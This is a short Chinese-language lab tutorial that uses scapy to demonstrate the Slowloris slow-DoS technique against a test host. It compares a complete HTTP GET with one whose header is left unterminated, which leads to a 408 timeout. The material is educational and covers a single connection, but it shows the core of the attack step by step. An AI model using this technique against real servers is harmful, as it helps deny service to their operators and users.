# 构造Slowloris数据包

> - 根据`slowloris`原理，构造一个数据包，模拟`slowloris`攻击。
> 
> - 使用工具scapy进行TCP连接，并构造`HTTP GET`数据包。
> 
> - 请求页面为`http://khdxs7.test`，页面内容只有`KHDXS7`这6个字符。

## 一、构造正常请求数据包

- 打开程序`scapy`
  
  ```bash
  scapy
  ```

- 创建一个`Socket`对象
  
  ```bash
  s1=socket.socket()
  ```

- 将`Socket`连接至服务器（初始化`TCP`）
  
  ```bash
  s1.connect(("khdxs7.test",80))
  ```

- 创建`StreamSocket`对象
  
  ```bash
  ss1=StreamSocket(s1,Raw)
  ```

- 发送数据到服务器，并接收响应
  
  注意：末尾的`\r\n`用来分隔`Header`和`Data`，但此次不发送`Data`。
  
  ```bash
  ss1.sr1(Raw("GET / HTTP/1.1\r\nHost:khdxs7.test\r\n\r\n"))
  ```
  
  > 立刻接收到响应数据包。`HTTP`报文数据部分正常显示字符`KHDXS7`。

## 二、构造Slowloris数据包

- 创建一个`Socket`对象
  
  ```bash
  s2=socket.socket()
  ```

- 将`Socket`连接至服务器（初始化`TCP`）
  
  ```bash
  s2.connect(("khdxs7.test",80))
  ```

- 创建`StreamSocket`对象
  
  ```bash
  ss2=StreamSocket(s2,Raw)
  ```

- 发送数据到服务器，并接收响应
  
  注意：结尾缺少用来分隔`Header`和`Data`的`\r\n`，因此发送的`Header`并不完整。
  
  ```bash
  ss2.sr1(Raw("GET / HTTP/1.1\r\nHost:khdxs7.test\r\n"))
  ```

> 等待大约`20`秒后，收到响应数据包。报文显示`408 请求超时`信息。

---

总结：通过这三个视频，已分别在应用方面、通信过程和数据包结构方面对`Slowloris`进行了详细的解释，相信各位也对慢速`DoS`攻击之一的`Slowloris`有了更深的理解。
